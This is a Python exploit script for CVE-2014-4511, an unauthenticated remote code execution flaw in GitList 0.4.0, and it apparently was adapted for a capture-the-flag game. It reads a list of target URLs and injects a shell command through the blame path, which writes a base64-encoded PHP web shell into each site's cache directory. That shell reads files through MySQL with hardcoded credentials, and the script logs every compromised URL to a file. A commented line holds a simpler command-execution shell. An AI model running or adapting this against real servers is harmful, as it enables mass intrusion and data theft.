#! /usr/bin/python

from commands import getoutput
import urllib
import sys
 
""" 
Exploit Title: Gitlist <= 0.4.0 anonymous RCE
Date: 06/20/2014
Author: drone (@dronesec)
Modified By. Underdog1987 (@underdog1987)
Vendor Homepage: http://gitlist.org/
Version: <= 0.4.0 & 0.5.0?
Fixed in: 0.5.0 / None?
Tested on: Debian/Raspbian
More information: http://hatriot.github.io/blog/2014/06/29/gitlist-rce/
cve: CVE-2014-4511

Usage: ./xpoitMooc.py [file with repo URL's] 
"""

print ""
print ""
print "*** Exploit Title: Gitlist <= 0.4.0 anonymous RCE ***"
print ""
print ""

if len(sys.argv) <= 1:
    print 'Usage %s: [file with repos URLs]' % sys.argv[0]
    print '  Example: python %s sites.txt' % sys.argv[0]
    sys.exit(1)
 
try:
    path="/var/www/gitlist/cache"
    #payload = "PD9zeXN0ZW0odXJsZGVjb2RlKCRfR0VUWydjbWQnXSkpOz8+Cg==" # payload <?system(urldecode($_GET['cmd']));?>
    payload = "PD9waHAKZXJyb3JfcmVwb3J0aW5nKC0xKTsKJF94PSRfR0VUWydlJ107CiRlPW15c3FsX2Nvbm5lY3QoJ2xvY2FsaG9zdCcsJ2NhY3RpJywnZXBNZU93QWI5Jyk7CmlmKCEkZSl7CiAgIGRpZSgnTm8gJy5teXNxbF9lcnJvcigpKTsKfQokaz1teXNxbF9zZWxlY3RfZGIoJ2NhY3RpJywkZSk7CmlmKCRrKXsKICAgJHo9bXlzcWxfcXVlcnkoInNlbGVjdCBsb2FkX2ZpbGUoJy92YXIvbGliL215c3FsL21vb2MtaGFja2luZy10ZWFtLTAwIi4kX3guIi1sZXZlbC0wMy5ncGcnKWFzIGJheiIpOwogICBpZigkeil7CiAgICAgICRyPW15c3FsX2ZldGNoX2Fzc29jKCR6KTsKICAgICAgZWNobyAkelsnYmF6J107CiAgIH0KfWVsc2V7CiAgIGRpZSgnbm9wZScpOwp9Cm15c3FsX2Nsb3NlKCRlKTs=PD9waHAKZXJyb3JfcmVwb3J0aW5nKC0xKTsKJF94PSRfR0VUWydlJ107CiRlPW15c3FsX2Nvbm5lY3QoJ2xvY2FsaG9zdCcsJ2NhY3RpJywnZXBNZU93QWI5Jyk7CmlmKCEkZSl7CiAgIGRpZSgnTm8gJy5teXNxbF9lcnJvcigpKTsKfQokaz1teXNxbF9zZWxlY3RfZGIoJ2NhY3RpJywkZSk7CmlmKCRrKXsKICAgJHo9bXlzcWxfcXVlcnkoInNlbGVjdCBsb2FkX2ZpbGUoJy92YXIvbGliL215c3FsL21vb2MtaGFja2luZy10ZWFtLTAwIi4kX3guIi1sZXZlbC0wMy5ncGcnKWFzIGJheiIpOwogICBpZigkeil7CiAgICAgICRyPW15c3FsX2ZldGNoX2Fzc29jKCR6KTsKICAgICAgZWNobyAkelsnYmF6J107CiAgIH0KfWVsc2V7CiAgIGRpZSgnbm9wZScpOwp9Cm15c3FsX2Nsb3NlKCRlKTs="
    mpath = '/blame/master/""`echo {0}|base64 -d > {1}/git.config.php`'.format(payload, path)
    urls=open(sys.argv[1],'r')
    writter=open('remote_shells_my.txt','a')
    for url in urls:
        url=url.strip()
        if url.startswith(";"):
            continue;
        url = url if url[-1] != '/' else url[:-1] # remove last /
        if url.startswith("http://") or url.startswith("https://"):
            print "[+] Trying put shell in %s ..." % url
            mpath = url+ urllib.quote(mpath)
            out = getoutput("wget %s" % mpath)
            if '500' in out:
                print "    [OK] Shell dropped; go hit %s/cache/git.config.php?e=<team number here>'" % url.rsplit('/', 1)[0]
                writter.write(url.rsplit('/', 1)[0] + "/cache/git.config.php?e=\n")
            else:
                print '    [-] Failed :( Is the target an instance of GitList 0.4.0? Is the target really vulnerable?'
        else:
            print "[!] Malformed URL"
    writter.close()
    print "[+] Check all URLs with shell in file remote_shells_my.txt"
except Exception as e:
    if "writter" in locals() or "writter" in globals():
        writter.close()
    print "[!] Cannot continue", e

